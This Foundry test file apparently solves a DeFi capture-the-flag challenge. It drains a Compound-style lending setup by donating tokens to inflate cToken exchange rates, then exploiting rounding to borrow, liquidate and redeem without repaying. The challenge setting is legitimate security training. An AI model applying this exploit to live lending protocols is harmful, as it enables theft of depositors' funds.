// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/challenge/Challenge.sol";
import "../src/Exploit.sol";

contract Solve is Test {
    Challenge public chall;

    AppworksToken public CUSD;
    AppworksToken public CStUSD;
    AppworksToken public CETH;
    AppworksToken public CWETH;

    CErc20Immutable public CCUSD;
    CErc20Immutable public CCStUSD;
    CErc20Immutable public CCETH;
    CErc20Immutable public CCWETH;

    Comptroller public comptroller;

    uint256 seed;
    address target;
    Deployer dd;

    function setUp() public {
        seed = 2023_12_18;
        target = address(uint160(seed));
        dd = new Deployer();

        chall = new Challenge();
        chall.init(seed, address(this), address(dd));

        CUSD = chall.CUSD();
        CStUSD = chall.CStUSD();
        CETH = chall.CETH();
        CWETH = chall.CWETH();

        CCUSD = chall.CCUSD();
        CCStUSD = chall.CCStUSD();
        CCETH = chall.CCETH();
        CCWETH = chall.CCWETH();

        comptroller = chall.comptroller();
    }

    //發現使用直接轉underlying token給cToken會導致匯率基底變大，再利用小數點問題可以利用redeemUnderlying不用還款狀態領取存入代幣
    function testSolve() public {
         /* Solve here */
         //此合約有 10000 ether 可以抵押
        uint collateralAmount = 10000;
        //pool原本有10000 ether 流動性也是要掏空金額
        uint poolAmount = 10000;
        while (poolAmount > 0) { 
           //pool原本有10000 ether - 因為操作交換利率可借出抵押10000*0.7*0.5直到掏空為止
           uint borrowAmount =   ((collateralAmount * 7)/10)* 5 /10;
           if(poolAmount > borrowAmount){
                poolAmount -= borrowAmount;
           }
           else{
                borrowAmount= poolAmount;
                poolAmount=0;
           }

            Exploit drainCETH = new Exploit(address(CCETH), address(CETH), address(chall), borrowAmount * 10**18);

            CWETH.transfer(address(drainCETH), CWETH.balanceOf(address(this)));

            drainCETH.drain();

            CETH.approve(address(CCETH), type(uint256).max);

            CCETH.liquidateBorrow(address(drainCETH), 1, CTokenInterface(CCWETH));

            CCWETH.redeem(1);
           
            console2.log(borrowAmount);
             console2.log("-------loop end---------");
        } 

        //CUSD
        Exploit drainCUSD = new Exploit(address(CCUSD), address(CUSD), address(chall), 10000 ether);

        CWETH.transfer(address(drainCUSD), CWETH.balanceOf(address(this)));

        drainCUSD.drain();

        CUSD.approve(address(CCUSD), type(uint256).max);

        CCUSD.liquidateBorrow(address(drainCUSD), 200, CTokenInterface(CCWETH));

        CCWETH.redeem(1);

        console2.log("-------loop end---------");
        
        CUSD.transfer(target, CUSD.balanceOf(address(this)));

        CETH.transfer(target, CETH.balanceOf(address(this)));

        CWETH.transfer(target, CWETH.balanceOf(address(this)));

        assertEq(chall.isSolved(), true);
    }
}